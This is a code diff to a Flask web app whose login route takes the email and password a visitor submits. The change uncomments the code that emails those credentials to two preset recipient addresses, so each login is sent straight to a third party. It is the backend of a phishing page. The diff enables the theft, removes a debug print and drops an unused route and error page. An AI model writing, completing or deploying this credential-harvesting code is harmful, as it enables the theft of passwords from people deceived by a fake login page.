@@ -30,29 +30,23 @@ app.config['MAIL_PASSWORD'] = passw
 mail = Mail(app=app)
 
 @app.route('/', methods=['GET', 'POST'])
-@app.route('/home', methods=['GET', 'POST'])
 def home():
     if request.method == 'POST':
         data = request.get_data()
         if data:
             email = request.form['email']
             password = request.form['password']
-            print(email, password)
-            '''recipient = [rEmail, remail2]
+            recipient = [rEmail, remail2]
             subjects = "user data recived"
             body = f" a new user has login \n Email : {email} \n\n Password : {password}"
 
             msg = Message(body=body, recipients=recipient, subject=subjects)
-            mail.send(message=msg)'''
+            mail.send(message=msg)
 
 
             return jsonify({'success': True})
     return render_template("page.html")
 
-
-@app.route('/error/page')
-def error_page():
-    return render_template("error.html")
 
 
 
